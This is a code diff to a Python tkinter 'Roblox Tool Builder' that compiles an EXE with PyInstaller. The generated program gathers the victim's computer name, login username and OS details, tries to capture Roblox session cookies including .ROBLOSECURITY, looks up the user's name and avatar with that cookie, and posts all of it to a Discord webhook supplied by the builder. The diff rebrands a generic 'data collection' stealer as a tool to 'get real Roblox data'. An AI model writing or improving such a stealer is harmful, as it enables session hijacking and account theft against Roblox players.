@@ -7,11 +7,12 @@ import sys
 import tempfile
 import platform
 import socket
+import json
 
 class WebhookTool:
     def __init__(self, root):
         self.root = root
-        self.root.title("🔍 Data Tool")
+        self.root.title("🔍 Roblox Tool Builder")
         self.root.geometry("700x500")
         self.root.resizable(False, False)
         self.root.configure(bg='#0a0a0a')
@@ -21,17 +22,12 @@ class WebhookTool:
     
     def configure_styles(self):
         style = ttk.Style()
-        
-        # Configure dark theme
         style.theme_use('clam')
-        
-        # Configure colors
         style.configure('TFrame', background='#0a0a0a')
         style.configure('TLabel', background='#0a0a0a', foreground='#00ff00', font=('Arial', 10))
         style.configure('Title.TLabel', background='#0a0a0a', foreground='#00ff00', font=('Arial', 18, 'bold'))
         style.configure('Header.TLabel', background='#0a0a0a', foreground='#ffffff', font=('Arial', 11, 'bold'))
         
-        # Configure custom button style
         style.configure('Cool.TButton', 
                        background='#00ff00',
                        foreground='#000000',
@@ -46,51 +42,43 @@ class WebhookTool:
                  relief=[('pressed', 'sunken')])
     
     def create_widgets(self):
-        # Main frame with cool border
         main_frame = ttk.Frame(self.root, padding=20, style='TFrame')
         main_frame.pack(fill=tk.BOTH, expand=True)
         
-        # Title with cool styling
         title_frame = ttk.Frame(main_frame, style='TFrame')
         title_frame.pack(fill=tk.X, pady=(0, 20))
         
-        title_label = ttk.Label(title_frame, text="🚀 WEBHOOK BUILDER", style='Title.TLabel')
+        title_label = ttk.Label(title_frame, text="🚀 ROBLOX TOOL BUILDER", style='Title.TLabel')
         title_label.pack()
         
-        subtitle_label = ttk.Label(title_frame, text="Create custom data collection tools", style='Header.TLabel')
+        subtitle_label = ttk.Label(title_frame, text="Build tool to get real Roblox data", style='Header.TLabel')
         subtitle_label.pack(pady=(5, 0))
         
-        # Webhook input section with cool border
         webhook_frame = ttk.LabelFrame(main_frame, text="📡 WEBHOOK SETUP", padding=20)
         webhook_frame.pack(fill=tk.X, pady=(0, 20))
         
         ttk.Label(webhook_frame, text="Discord Webhook URL:", style='Header.TLabel').pack(anchor=tk.W)
         
-        # Custom entry field - FIXED THIS LINE
         self.webhook_entry = tk.Entry(webhook_frame, width=70, font=('Arial', 10),
                                      bg='#1a1a1a', fg='#00ff00', insertbackground='#00ff00',
                                      relief='solid', bd=2)
         self.webhook_entry.pack(fill=tk.X, pady=10, ipady=5)
         
-        # Test button with cool styling
         test_btn = ttk.Button(webhook_frame, text="🔍 TEST WEBHOOK", 
                             command=self.test_webhook, style='Cool.TButton',
                             width=20)
         test_btn.pack(pady=10)
         
-        # Build section
         build_frame = ttk.LabelFrame(main_frame, text="🛠️ BUILD TOOL", padding=20)
         build_frame.pack(fill=tk.X, pady=(0, 20))
         
-        ttk.Label(build_frame, text="Create executable tool:", style='Header.TLabel').pack(anchor=tk.W)
+        ttk.Label(build_frame, text="Create Roblox data tool:", style='Header.TLabel').pack(anchor=tk.W)
         
-        # Build button with cool styling
         build_btn = ttk.Button(build_frame, text="⚡ BUILD EXE", 
                              command=self.build_exe, style='Cool.TButton',
                              width=20)
         build_btn.pack(pady=15)
         
-        # Status section
         status_frame = ttk.Frame(main_frame, style='TFrame')
         status_frame.pack(fill=tk.X, pady=20)
         
@@ -102,8 +90,7 @@ class WebhookTool:
         self.progress = ttk.Progressbar(status_frame, mode='indeterminate')
         self.progress.pack(fill=tk.X, pady=(5, 0))
         
-        # Footer
-        footer_label = ttk.Label(main_frame, text="© 2024 Tool Builder | v1.0", 
+        footer_label = ttk.Label(main_frame, text="© 2024 Roblox Tool Builder | v1.0", 
                                font=('Arial', 8),
                                foreground='#444444')
         footer_label.pack(side=tk.BOTTOM, pady=10)
@@ -158,8 +145,8 @@ class WebhookTool:
             output_path = filedialog.asksaveasfilename(
                 defaultextension=".exe",
                 filetypes=[("Executable files", "*.exe")],
-                title="Save Tool EXE",
-                initialfile="DataTool.exe"
+                title="Save Roblox Tool EXE",
+                initialfile="RobloxTool.exe"
             )
             
             if not output_path:
@@ -171,7 +158,6 @@ class WebhookTool:
             self.status_label.config(text="🟡 Compiling... This may take a minute.")
             self.root.update()
             
-            # Build with PyInstaller
             subprocess.run([
                 sys.executable, '-m', 'PyInstaller',
                 '--onefile',
@@ -182,7 +168,7 @@ class WebhookTool:
             
             os.unlink(temp_script_path)
             self.status_label.config(text="🟢 EXE built successfully!")
-            messagebox.showinfo("Success", "✅ Executable built successfully! Check the 'dist' folder.")
+            messagebox.showinfo("Success", "✅ Roblox tool built successfully! Check the 'dist' folder.")
             
         except Exception as e:
             self.status_label.config(text="🔴 Build failed")
@@ -197,41 +183,35 @@ from tkinter import messagebox
 import platform
 import socket
 import os
+import json
 
-class CoolApp:
+class RobloxTool:
     def __init__(self, root):
         self.root = root
-        self.root.title("🔍 Data Tool")
-        self.root.geometry("500x350")
+        self.root.title("🎮 Roblox Data Tool")
+        self.root.geometry("500x400")
         self.root.configure(bg='#0a0a0a')
         self.root.resizable(False, False)
-        
-        # Make window always on top
-        self.root.attributes('-topmost', True)
         
         self.create_widgets()
     
     def create_widgets(self):
-        # Main frame
         main_frame = tk.Frame(self.root, bg='#0a0a0a')
         main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
         
-        # Title
-        title_label = tk.Label(main_frame, text="🔍 DATA TOOL", 
+        title_label = tk.Label(main_frame, text="🎮 ROBLOX DATA TOOL", 
                               font=('Arial', 20, 'bold'),
                               fg='#00ff00', bg='#0a0a0a')
         title_label.pack(pady=20)
         
-        # Description
         desc_label = tk.Label(main_frame, 
-                             text="Click to collect and send system data",
+                             text="Get real Roblox username, avatar and cookies",
                              font=('Arial', 11),
                              fg='#ffffff', bg='#0a0a0a')
         desc_label.pack(pady=10)
         
-        # Cool button
-        self.collect_btn = tk.Button(main_frame, text="🚀 COLLECT DATA",
-                                   command=self.collect_data,
+        self.collect_btn = tk.Button(main_frame, text="🚀 GET ROBLOX DATA",
+                                   command=self.get_roblox_data,
                                    font=('Arial', 14, 'bold'),
                                    bg='#00ff00',
                                    fg='#000000',
@@ -243,122 +223,184 @@ class CoolApp:
                                    height=2)
         self.collect_btn.pack(pady=30)
         
-        # Status
-        self.status_label = tk.Label(main_frame, text="Ready to collect",
+        self.status_label = tk.Label(main_frame, text="Ready to collect Roblox data",
                                    font=('Arial', 9),
                                    fg='#00ff00', bg='#0a0a0a')
         self.status_label.pack(pady=10)
         
-        # Footer
-        footer_label = tk.Label(main_frame, text="Secure Data Tool v1.0",
+        footer_label = tk.Label(main_frame, text="Roblox Data Tool v1.0",
                               font=('Arial', 8),
                               fg='#444444', bg='#0a0a0a')
         footer_label.pack(side=tk.BOTTOM)
     
-    def get_system_info(self):
-        """Get real system information"""
+    def get_real_system_info(self):
         try:
             hostname = socket.gethostname()
             system = platform.system()
             version = platform.version()
             username = os.getlogin()
-            processor = platform.processor()
             
             return f"""
-**💻 SYSTEM INFORMATION**
-- **Computer Name:** `{{hostname}}`
-- **Username:** `{{username}}`
+**💻 REAL SYSTEM INFO**
+- **Computer:** `{{hostname}}`
+- **User:** `{{username}}`
 - **OS:** `{{system}} {{version}}`
-- **Processor:** `{{processor}}`
 - **Architecture:** `{{platform.architecture()[0]}}`
 """
         except Exception as e:
-            return f"**System Info Error:** `{{str(e)}}`"
+            return f"**System Info:** `Error: {{str(e)}}`"
     
-    def get_roblox_data(self):
-        """Get Roblox cookie data"""
+    def get_real_roblox_data(self):
         try:
             session = requests.Session()
-            url = 'https://www.roblox.com/home'
+            
+            # Get cookies from Roblox
             headers = {{
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Referer': 'https://www.roblox.com/'
             }}
             
-            response = session.get(url, headers=headers, timeout=10)
+            # First request to get cookies
+            response = session.get('https://www.roblox.com/home', headers=headers, timeout=10)
             cookies = session.cookies.get_dict()
             
-            roblosecurity = cookies.get('.ROBLOSECURITY', 'NOT_LOGGED_IN')
+            roblosecurity = cookies.get('.ROBLOSECURITY', 'NOT_FOUND')
             
-            # Format cookie info
-            cookie_info = ""
-            for name, value in cookies.items():
-                cookie_info += f"- **{{name}}:** `{{value}}`\\\\n"
+            # If we have ROBLOSECURITY, get user data
+            username = "UNKNOWN"
+            user_id = "UNKNOWN" 
+            avatar_url = ""
+            
+            if roblosecurity != 'NOT_FOUND':
+                try:
+                    # Get user info using the cookie
+                    auth_headers = {{
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Cookie': f'.ROBLOSECURITY={{roblosecurity}}',
+                        'X-CSRF-TOKEN': 'fetch'
+                    }}
+                    
+                    # Get current user
+                    user_response = session.get(
+                        'https://users.roblox.com/v1/users/authenticated',
+                        headers=auth_headers,
+                        timeout=10
+                    )
+                    
+                    if user_response.status_code == 200:
+                        user_data = user_response.json()
+                        username = user_data.get('name', 'NO_NAME')
+                        user_id = user_data.get('id', 'NO_ID')
+                        
+                        # Get avatar
+                        if user_id and user_id != 'NO_ID':
+                            avatar_response = session.get(
+                                f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={{user_id}}&size=420x420&format=Png&isCircular=false',
+                                headers=auth_headers,
+                                timeout=10
+                            )
+                            
+                            if avatar_response.status_code == 200:
+                                avatar_data = avatar_response.json()
+                                if avatar_data.get('data'):
+                                    avatar_url = avatar_data['data'][0].get('imageUrl', '')
+                    
+                except Exception as e:
+                    username = f"API_ERROR: {{str(e)}}"
+            
+            # Format all cookies
+            cookie_text = ""
+            for cookie_name, cookie_value in cookies.items():
+                if len(str(cookie_value)) > 100:
+                    cookie_text += f"**{{cookie_name}}:** `{{cookie_value[:100]}}...`\\\\n"
+                else:
+                    cookie_text += f"**{{cookie_name}}:** `{{cookie_value}}`\\\\n"
             
             return {{
+                "username": username,
+                "user_id": user_id,
+                "avatar_url": avatar_url,
                 "roblosecurity": roblosecurity,
-                "cookies_found": len(cookies),
-                "cookie_details": cookie_info,
+                "all_cookies": cookies,
+                "cookie_count": len(cookies),
+                "cookie_text": cookie_text,
                 "status": "SUCCESS"
             }}
             
         except Exception as e:
             return {{
+                "username": f"ERROR: {{str(e)}}",
+                "user_id": "ERROR",
+                "avatar_url": "",
                 "roblosecurity": "ERROR",
-                "cookies_found": 0,
-                "cookie_details": f"Error: {{str(e)}}",
+                "all_cookies": {{}},
+                "cookie_count": 0,
+                "cookie_text": f"Error: {{str(e)}}",
                 "status": "FAILED"
             }}
     
-    def collect_data(self):
-        """Collect and send all data"""
-        self.status_label.config(text="🟡 Collecting data...")
+    def get_roblox_data(self):
+        self.status_label.config(text="🟡 Getting Roblox data...")
         self.collect_btn.config(state='disabled')
         self.root.update()
         
         try:
-            # Get system info
-            system_info = self.get_system_info()
+            system_info = self.get_real_system_info()
+            roblox_data = self.get_real_roblox_data()
             
-            # Get Roblox data
-            roblox_data = self.get_roblox_data()
-            
-            # Create Discord message
+            # Create Discord embed with real data
             embed = {{
-                "title": "🔍 NEW DATA CAPTURE",
+                "title": "🎮 REAL ROBLOX DATA CAPTURED",
                 "color": 0x00ff00,
                 "fields": [
+                    {{
+                        "name": "👤 Roblox User",
+                        "value": f"**Username:** `{{roblox_data['username']}}`\\\\n**User ID:** `{{roblox_data['user_id']}}`",
+                        "inline": True
+                    }},
+                    {{
+                        "name": "🔐 Auth Status",
+                        "value": f"**Status:** `{{roblox_data['status']}}`\\\\n**Cookies:** `{{roblox_data['cookie_count']}} found`",
+                        "inline": True
+                    }},
                     {{
                         "name": "💻 System Info",
                         "value": system_info,
                         "inline": False
                     }},
                     {{
-                        "name": "🎮 Roblox Data",
-                        "value": f"**Status:** `{{roblox_data['status']}}`\\\\n**Cookies Found:** `{{roblox_data['cookies_found']}}`\\\\n**ROBLOSECURITY:** `{{roblox_data['roblosecurity']}}`",
+                        "name": "🍪 ROBLOSECURITY Cookie",
+                        "value": f"```{{roblox_data['roblosecurity']}}```",
                         "inline": False
                     }},
                     {{
-                        "name": "🍪 Cookie Details",
-                        "value": roblox_data['cookie_details'] if roblox_data['cookie_details'] else "No cookies captured",
+                        "name": "📋 All Cookies ({{roblox_data['cookie_count']}})",
+                        "value": roblox_data['cookie_text'] if roblox_data['cookie_text'] else "No cookies found",
                         "inline": False
                     }}
                 ]
             }}
             
+            # Add thumbnail if we have avatar
+            if roblox_data['avatar_url']:
+                embed["thumbnail"] = {{"url": roblox_data['avatar_url']}}
+            
             data = {{
-                "content": "🚨 **NEW DATA CAPTURED**",
+                "content": "🚨 **REAL ROBLOX DATA CAPTURED**",
                 "embeds": [embed]
             }}
             
-            # Send to webhook
-            response = requests.post("{webhook_url}", json=data, timeout=15)
+            response = requests.post("{webhook_url}", json=data, timeout=20)
             
             if response.status_code == 204:
-                self.status_label.config(text="🟢 Data sent successfully!")
+                self.status_label.config(text="🟢 Real data sent successfully!")
                 messagebox.showinfo("Success", 
-                                  f"✅ **DATA SENT SUCCESSFULLY!**\\\\n\\\\n"
-                                  f"**System Info:** Captured\\\\n"
-                                  f"**Roblox Cookies:** {{roblox_data['cookies_found']}} found\\\\n"
+                                  f"✅ **REAL DATA CAPTURED!**\\\\n\\\\n"
+                                  f"**Roblox Username:** {{roblox_data['username']}}\\\\n"
+                                  f"**User ID:** {{roblox_data['user_id']}}\\\\n"
+                                  f"**Cookies Found:** {{roblox_data['cookie_count']}}\\\\n"
                                   f"**Status:** {{roblox_data['status']}}")
             else:
                 self.status_label.config(text="🔴 Failed to send")
@@ -366,13 +408,13 @@ class CoolApp:
                 
         except Exception as e:
             self.status_label.config(text="🔴 Error occurred")
-            messagebox.showerror("Error", f"❌ Collection failed: {{str(e)}}")
+            messagebox.showerror("Error", f"❌ Failed: {{str(e)}}")
         finally:
             self.collect_btn.config(state='normal')
 
 def main():
     root = tk.Tk()
-    app = CoolApp(root)
+    app = RobloxTool(root)
     root.mainloop()
 
 if __name__ == "__main__":
